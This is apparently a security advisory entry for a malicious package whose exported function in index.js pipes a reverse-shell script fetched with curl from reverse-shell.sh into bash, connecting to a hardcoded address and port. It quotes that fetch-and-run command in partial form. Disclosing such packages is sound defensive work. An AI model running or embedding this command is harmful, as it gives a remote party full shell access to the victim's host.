summary: Reverse shell dropper via exported function
details: index.js exports a function that runs `/bin/bash -c "curl https://reverse-shell.sh/... | sh"`, fetching a reverse-shell script from reverse-shell.sh and piping it directly to a shell. The fetched script targets the hardcoded address 10.0.72.234:4444, opening an interactive shell from the installer's host to that endpoint. Any consumer invoking the exported API triggers full remote code execution and a persistent reverse shell to the hardcoded remote party.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
